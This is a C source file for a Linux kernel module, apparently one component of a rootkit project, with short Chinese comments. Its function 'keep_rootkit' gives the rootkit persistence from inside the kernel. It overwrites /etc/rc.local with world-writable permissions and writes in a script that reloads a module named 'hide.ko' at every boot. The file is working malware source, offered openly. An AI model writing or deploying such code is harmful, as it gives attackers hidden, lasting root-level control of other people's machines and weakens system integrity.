#include "../header/hide.h"

// 注意：该功能和fake模块配合使用会有奇效（逃
// 祝你启动成功
void keep_rootkit() {
  struct file *fp;
  ssize_t rx;
  __kernel_loff_t pos;
  static char write_buf[] = "#!/bin/sh\ninsmod /home/link/Desktop/final/hide.ko";
  static char rootkit_path[] = "/etc/rc.local";

  fp = filp_open(rootkit_path, O_RDWR | O_CREAT, 0777);
  if (IS_ERR(fp)) {
    printk(KERN_INFO "file open failed!");
  } else {
    pos = 0;
    rx = kernel_write(fp, write_buf, sizeof(write_buf), &pos);
    
    filp_close(fp, NULL);
    
    if(rx > 0) {
      printk(KERN_INFO "file write successd!");
    } else{
      printk(KERN_INFO "file write failed!");
    }
  }
  return ;
}